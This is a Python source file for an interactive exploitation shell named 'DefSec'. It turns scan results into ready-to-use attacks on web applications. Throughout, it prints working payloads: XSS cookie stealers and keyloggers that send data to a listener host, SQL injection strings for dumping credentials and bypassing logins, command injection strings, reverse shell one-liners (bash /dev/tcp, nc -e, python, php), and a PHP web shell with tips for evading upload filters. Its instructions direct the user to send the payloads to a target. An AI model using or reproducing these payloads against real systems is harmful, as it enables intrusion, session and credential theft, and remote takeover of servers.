"""DefSec Interactive Shell Module"""
import cmd
import sys
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from typing import Dict, List, Optional
import json
import requests
import socket
import paramiko
import ftplib
import re
from urllib.parse import urljoin, parse_qs, urlparse

console = Console()

class DefSecShell(cmd.Cmd):
    intro = '''
╔═══════════════════════════════════════════════════════════════╗
║                   DefSec Interactive Shell                     ║
║                    Version 1.0 (Beta)                         ║
║         Type 'help' or '?' to list available commands         ║
╚═══════════════════════════════════════════════════════════════╝
'''
    prompt = '[DefSec]> '

    def __init__(self, scan_results: Dict):
        super().__init__()
        self.scan_results = scan_results
        self.current_target = None
        self.current_vuln = None
        self.exploits = {}
        self._load_exploits()

    def _load_exploits(self):
        """Load available exploits for different vulnerabilities"""
        self.exploits = {
            'xss': {
                'steal_cookie': self._exploit_xss_cookie_steal,
                'defacement': self._exploit_xss_defacement,
                'keylogger': self._exploit_xss_keylogger
            },
            'sqli': {
                'dump_tables': self._exploit_sqli_dump_tables,
                'bypass_auth': self._exploit_sqli_auth_bypass,
                'union_select': self._exploit_sqli_union
            },
            'rce': {
                'command': self._exploit_rce_command,
                'reverse_shell': self._exploit_rce_reverse_shell,
                'upload': self._exploit_rce_upload
            }
        }

    def _show_vulnerabilities(self):
        """Display discovered vulnerabilities in a table"""
        web_vulns = self.scan_results.get('web_vulnerabilities', {})

        if web_vulns.get('xss_vulnerabilities'):
            table = Table(title="XSS Vulnerabilities")
            table.add_column("ID", style="cyan")
            table.add_column("URL", style="magenta")
            table.add_column("Parameter", style="green")
            table.add_column("Type", style="yellow")
            table.add_column("Available Exploits", style="red")

            for idx, vuln in enumerate(web_vulns['xss_vulnerabilities'], 1):
                table.add_row(
                    str(idx),
                    vuln.get('url', 'Unknown'),
                    vuln.get('parameter', 'Unknown'),
                    vuln.get('type', 'Unknown'),
                    ", ".join(self.exploits['xss'].keys())
                )
            console.print(table)

        if web_vulns.get('sqli_vulnerabilities'):
            table = Table(title="SQL Injection Vulnerabilities")
            table.add_column("ID", style="cyan")
            table.add_column("URL", style="magenta")
            table.add_column("Parameter", style="green")
            table.add_column("Type", style="yellow")
            table.add_column("Available Exploits", style="red")

            for idx, vuln in enumerate(web_vulns['sqli_vulnerabilities'], 1):
                table.add_row(
                    str(idx),
                    vuln.get('url', 'Unknown'),
                    vuln.get('parameter', 'Unknown'),
                    vuln.get('type', 'Unknown'),
                    ", ".join(self.exploits['sqli'].keys())
                )
            console.print(table)

        if web_vulns.get('rce_vulnerabilities'):
            table = Table(title="Remote Code Execution Vulnerabilities")
            table.add_column("ID", style="cyan")
            table.add_column("URL", style="magenta")
            table.add_column("Parameter", style="green")
            table.add_column("Available Exploits", style="red")

            for idx, vuln in enumerate(web_vulns['rce_vulnerabilities'], 1):
                table.add_row(
                    str(idx),
                    vuln.get('url', 'Unknown'),
                    vuln.get('parameter', 'Unknown'),
                    ", ".join(self.exploits['rce'].keys())
                )
            console.print(table)

    def _show_exploits(self):
        """Display available exploits"""
        table = Table(title="Available Exploits")
        table.add_column("Type", style="cyan")
        table.add_column("Name", style="green")
        table.add_column("Description", style="yellow")

        for vuln_type, exploits in self.exploits.items():
            for exploit_name, exploit_func in exploits.items():
                table.add_row(
                    vuln_type.upper(),
                    exploit_name,
                    self._get_exploit_description(vuln_type, exploit_name)
                )
        console.print(table)

    def _get_exploit_description(self, vuln_type: str, exploit_name: str) -> str:
        """Get description for an exploit"""
        descriptions = {
            'xss': {
                'steal_cookie': 'Steal user session cookies via XSS',
                'defacement': 'Deface page content via XSS',
                'keylogger': 'Capture keystrokes via XSS'
            },
            'sqli': {
                'dump_tables': 'Dump database tables via SQL injection',
                'bypass_auth': 'Bypass authentication via SQL injection',
                'union_select': 'Extract data via UNION SELECT injection'
            },
            'rce': {
                'command': 'Execute system commands',
                'reverse_shell': 'Get reverse shell access',
                'upload': 'Upload malicious files'
            }
        }
        return descriptions.get(vuln_type, {}).get(exploit_name, 'No description available')

    def _exploit_xss_cookie_steal(self):
        """XSS Cookie Stealing Exploit"""
        if not self.current_vuln:
            console.print("[red]No vulnerability selected. Use 'use' command first.[/]")
            return

        console.print("[yellow]Starting XSS Cookie Stealer...[/]")
        url = self.current_vuln.get('url', '')
        param = self.current_vuln.get('parameter', '')

        # Generate cookie stealing payload
        payload = """<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://YOUR-LISTENER-HERE/?cookie=' + encodeURIComponent(document.cookie));
xhr.send();
</script>"""

        console.print(Panel(f"""
[cyan]Cookie Stealer Payload:[/]
{payload}

[cyan]Test URL:[/]
{url}?{param}={payload}

[cyan]Instructions:[/]
1. Set up a listener (e.g., Burp Collaborator or your own server)
2. Replace YOUR-LISTENER-HERE with your listener URL
3. Send the URL to the target
        """))

    def _exploit_xss_defacement(self):
        """XSS Page Defacement Exploit"""
        if not self.current_vuln:
            console.print("[red]No vulnerability selected. Use 'use' command first.[/]")
            return

        console.print("[yellow]Starting XSS Defacement...[/]")
        url = self.current_vuln.get('url', '')
        param = self.current_vuln.get('parameter', '')

        # Generate defacement payload
        payload = """<script>
document.body.innerHTML = '<h1>Site Defaced by DefSec</h1>';
document.body.style.background = 'black';
document.body.style.color = 'red';
</script>"""

        console.print(Panel(f"""
[cyan]Defacement Payload:[/]
{payload}

[cyan]Test URL:[/]
{url}?{param}={payload}
        """))

    def _exploit_xss_keylogger(self):
        """XSS Keylogger Exploit"""
        if not self.current_vuln:
            console.print("[red]No vulnerability selected. Use 'use' command first.[/]")
            return

        console.print("[yellow]Starting XSS Keylogger...[/]")
        url = self.current_vuln.get('url', '')
        param = self.current_vuln.get('parameter', '')

        # Generate keylogger payload
        payload = """<script>
document.onkeypress = function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://YOUR-LISTENER-HERE/?key=' + e.key);
    xhr.send();
}
</script>"""

        console.print(Panel(f"""
[cyan]Keylogger Payload:[/]
{payload}

[cyan]Test URL:[/]
{url}?{param}={payload}

[cyan]Instructions:[/]
1. Set up a listener (e.g., Burp Collaborator or your own server)
2. Replace YOUR-LISTENER-HERE with your listener URL
3. Send the URL to the target
        """))

    def _exploit_sqli_dump_tables(self):
        """SQL Injection Table Dumping Exploit"""
        if not self.current_vuln:
            console.print("[red]No vulnerability selected. Use 'use' command first.[/]")
            return

        console.print("[yellow]Starting SQL Injection Table Dumper...[/]")
        url = self.current_vuln.get('url', '')
        param = self.current_vuln.get('parameter', '')

        payloads = [
            "' UNION SELECT NULL,table_name FROM information_schema.tables-- -",
            "' UNION SELECT NULL,column_name FROM information_schema.columns-- -",
            "' UNION SELECT NULL,CONCAT(username,'|',password) FROM users-- -"
        ]

        console.print(Panel(f"""
[cyan]SQL Injection Payloads:[/]
{chr(10).join(f"• {payload}" for payload in payloads)}

[cyan]Test URLs:[/]
{chr(10).join(f"• {url}?{param}={payload}" for payload in payloads)}

[cyan]SQLMap Command:[/]
sqlmap -u '{url}' -p {param} --batch --random-agent --dump
        """))

    def _exploit_sqli_auth_bypass(self):
        """SQL Injection Authentication Bypass"""
        if not self.current_vuln:
            console.print("[red]No vulnerability selected. Use 'use' command first.[/]")
            return

        console.print("[yellow]Starting SQL Authentication Bypass...[/]")
        url = self.current_vuln.get('url', '')
        param = self.current_vuln.get('parameter', '')

        payloads = [
            "' OR '1'='1",
            "admin' --",
            "admin' #",
            "' OR 'x'='x",
            "' OR 1=1--",
            "')) OR 1=1--"
        ]

        console.print(Panel(f"""
[cyan]Auth Bypass Payloads:[/]
{chr(10).join(f"• {payload}" for payload in payloads)}

[cyan]Test URLs:[/]
{chr(10).join(f"• {url}?{param}={payload}" for payload in payloads)}
        """))

    def _exploit_sqli_union(self):
        """SQL Injection UNION Attack"""
        if not self.current_vuln:
            console.print("[red]No vulnerability selected. Use 'use' command first.[/]")
            return

        console.print("[yellow]Starting UNION-based SQL Injection...[/]")
        url = self.current_vuln.get('url', '')
        param = self.current_vuln.get('parameter', '')

        payloads = [
            "' UNION SELECT NULL,NULL-- -",  # Test number of columns
            "' UNION SELECT @@version,NULL-- -",  # Get version
            "' UNION SELECT table_name,NULL FROM information_schema.tables-- -",  # Get tables
            "' UNION SELECT NULL,GROUP_CONCAT(column_name) FROM information_schema.columns-- -"  # Get columns
        ]

        console.print(Panel(f"""
[cyan]UNION Attack Payloads:[/]
{chr(10).join(f"• {payload}" for payload in payloads)}

[cyan]Test URLs:[/]
{chr(10).join(f"• {url}?{param}={payload}" for payload in payloads)}
        """))

    def _exploit_rce_command(self):
        """Remote Command Execution"""
        if not self.current_vuln:
            console.print("[red]No vulnerability selected. Use 'use' command first.[/]")
            return

        console.print("[yellow]Starting Remote Command Execution...[/]")
        url = self.current_vuln.get('url', '')
        param = self.current_vuln.get('parameter', '')

        payloads = [
            ";id",
            "|id",
            "`id`",
            "$(id)",
            "& whoami &",
            "|| whoami ||",
            "; uname -a #"
        ]

        console.print(Panel(f"""
[cyan]RCE Command Payloads:[/]
{chr(10).join(f"• {payload}" for payload in payloads)}

[cyan]Test URLs:[/]
{chr(10).join(f"• {url}?{param}={payload}" for payload in payloads)}
        """))

    def _exploit_rce_reverse_shell(self):
        """RCE Reverse Shell Exploit"""
        if not self.current_vuln:
            console.print("[red]No vulnerability selected. Use 'use' command first.[/]")
            return

        console.print("[yellow]Starting Reverse Shell Generator...[/]")
        url = self.current_vuln.get('url', '')
        param = self.current_vuln.get('parameter', '')

        shell_payloads = [
            "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"YOUR-IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "bash -i >& /dev/tcp/YOUR-IP/4444 0>&1",
            "nc -e /bin/sh YOUR-IP 4444",
            "php -r '$sock=fsockopen(\"YOUR-IP\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ]

        console.print(Panel(f"""
[cyan]Reverse Shell Payloads:[/]
{chr(10).join(f"• {payload}" for payload in shell_payloads)}

[cyan]Instructions:[/]
1. Start a netcat listener: nc -lvnp 4444
2. Replace YOUR-IP with your IP address
3. URL encode the payload
4. Send the payload: {url}?{param}=[ENCODED_PAYLOAD]
        """))

    def _exploit_rce_upload(self):
        """RCE File Upload Exploit"""
        if not self.current_vuln:
            console.print("[red]No vulnerability selected. Use 'use' command first.[/]")
            return

        console.print("[yellow]Starting File Upload Exploit Generator...[/]")
        url = self.current_vuln.get('url', '')
        param = self.current_vuln.get('parameter', '')

        webshell_php = """<?php
if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
}?>"""

        console.print(Panel(f"""
[cyan]Web Shell Code (save as shell.php):[/]
{webshell_php}

[cyan]Usage:[/]
1. Upload the file to: {url}
2. Access shell at: [url]/shell.php?cmd=whoami

[cyan]Tips:[/]
• Try different extensions: .php, .php5, .phtml
• Try bypassing filters with: shell.jpg.php
• Try modifying content-type header
        """))

    def do_use(self, arg):
        """Use a specific exploit: use <vuln_type>/<vuln_id>/<exploit>"""
        args = arg.split('/')
        if len(args) != 3:
            console.print("[red]Error: Invalid format. Use 'use vuln_type/vuln_id/exploit'[/]")
            console.print("Example: use xss/1/steal_cookie")
            return

        vuln_type, vuln_id, exploit = args
        try:
            vuln_id = int(vuln_id)
            web_vulns = self.scan_results.get('web_vulnerabilities', {})

            if vuln_type not in self.exploits:
                console.print(f"[red]Invalid vulnerability type: {vuln_type}[/]")
                return

            if exploit not in self.exploits[vuln_type]:
                console.print(f"[red]Invalid exploit: {exploit}[/]")
                return

            vulns = web_vulns.get(f'{vuln_type}_vulnerabilities', [])
            if not (1 <= vuln_id <= len(vulns)):
                console.print(f"[red]Invalid vulnerability ID: {vuln_id}[/]")
                return

            self.current_vuln = vulns[vuln_id - 1]
            console.print(f"[green]Using {vuln_type}/{exploit} exploit for vulnerability {vuln_id}...[/]")
            self.exploits[vuln_type][exploit]()

        except ValueError:
            console.print("[red]Invalid vulnerability ID[/]")
        except Exception as e:
            console.print(f"[red]Error running exploit: {str(e)}[/]")

    def do_set(self, arg):
        """Set various options: target, port, etc."""
        args = arg.split()
        if len(args) < 2:
            console.print("[red]Error: Missing arguments. Use 'set option value'[/]")
            return

        option, value = args[0], ' '.join(args[1:])
        if option == 'target':
            self.current_target = value
            console.print(f"[green]Target set to: {value}[/]")
        else:
            console.print("[red]Invalid option[/]")

    def do_info(self, arg):
        """Display information about a specific vulnerability or exploit"""
        if not arg:
            console.print("[red]Error: Missing argument. Use 'info <vuln_type>/<vuln_id>'[/]")
            return

        try:
            vuln_type, vuln_id = arg.split('/')
            vuln_id = int(vuln_id)
            web_vulns = self.scan_results.get('web_vulnerabilities', {})
            vulns = web_vulns.get(f'{vuln_type}_vulnerabilities', [])

            if 1 <= vuln_id <= len(vulns):
                vuln = vulns[vuln_id - 1]
                self._show_vuln_details(vuln, vuln_type)
            else:
                console.print("[red]Invalid vulnerability ID[/]")
        except ValueError:
            console.print("[red]Invalid format. Use 'info <vuln_type>/<vuln_id>'")

    def _show_vuln_details(self, vuln: Dict, vuln_type: str):
        """Show detailed information about a vulnerability"""
        panel = Panel(
            Text.from_markup(f"""
[cyan]Type:[/] {vuln_type.upper()}
[cyan]URL:[/] {vuln.get('url', 'Unknown')}
[cyan]Parameter:[/] {vuln.get('parameter', 'Unknown')}
[cyan]Payload:[/] {vuln.get('payload', 'Unknown')}

[cyan]Available Exploits:[/]
{self._format_exploit_list(vuln_type)}

[cyan]POC Commands:[/]
{self._format_poc_commands(vuln, vuln_type)}
            """),
            title="Vulnerability Details",
            border_style="green"
        )
        console.print(panel)

    def _format_exploit_list(self, vuln_type: str) -> str:
        """Format the list of available exploits for a vulnerability type"""
        exploit_list = []
        for name, _ in self.exploits.get(vuln_type, {}).items():
            desc = self._get_exploit_description(vuln_type, name)
            exploit_list.append(f"• {name}: {desc}")
        return "\n".join(exploit_list)

    def _format_poc_commands(self, vuln: Dict, vuln_type: str) -> str:
        """Format POC commands for the vulnerability"""
        commands = []
        url = vuln.get('url', '')
        param = vuln.get('parameter', '')
        payload = vuln.get('payload', '')

        commands.append(f"curl -X GET '{url}' -H 'User-Agent: DefSec-Scanner/1.0' --data '{param}={payload}'")

        if vuln_type == 'xss':
            commands.append(f"Browser URL: {url}?{param}={payload}")
        elif vuln_type == 'sqli':
            commands.append(f"SQLMap: sqlmap -u '{url}' -p {param} --batch --random-agent")

        return "\n".join(commands)

    def do_exit(self, arg):
        """Exit the DefSec shell"""
        console.print("[yellow]Exiting DefSec shell...[/]")
        return True

    def default(self, line):
        """Handle unknown commands"""
        console.print(f"[red]Unknown command: {line}[/]")
        console.print("Type 'help' or '?' to list available commands")

    def do_help(self, arg):
        """Show help information"""
        if arg:
            # Show help for specific command
            super().do_help(arg)
        else:
            # Show general help
            console.print(Panel("""
[cyan]Available Commands:[/]

• show vulns      - Display discovered vulnerabilities
• show services   - Display discovered services
• show exploits   - Display available exploits
• use TYPE/ID/EXPLOIT - Use specific exploit (e.g., use xss/1/steal_cookie)
• set target HOST - Set target for exploitation
• info TYPE/ID    - Show detailed information about a vulnerability
• help            - Show this help message
• exit            - Exit the shell

[cyan]Examples:[/]
• show vulns
• use xss/1/steal_cookie
• info xss/1
            """, title="DefSec Shell Help"))
    def do_show(self, arg):
        """Show various information: vulns, services, exploits"""
        args = arg.split()
        if not args:
            console.print("[red]Error: Missing argument. Use 'show vulns|services|exploits'[/]")
            return

        if args[0] == 'vulns':
            self._show_vulnerabilities()
        elif args[0] == 'services':
            self._show_services()
        elif args[0] == 'exploits':
            self._show_exploits()
        else:
            console.print("[red]Invalid option. Use 'show vulns|services|exploits'[/]")

    def _show_services(self):
        """Display discovered services in a table"""
        table = Table(title="Discovered Services")
        table.add_column("Port", style="cyan")
        table.add_column("Service", style="green")
        table.add_column("Version", style="yellow")
        table.add_column("State", style="magenta")

        if 'ports' in self.scan_results:
            for port, info in self.scan_results['ports'].items():
                table.add_row(
                    str(port),
                    info.get('service', 'Unknown'),
                    info.get('version', 'Unknown'),
                    info.get('state', 'Unknown')
                )
        console.print(table)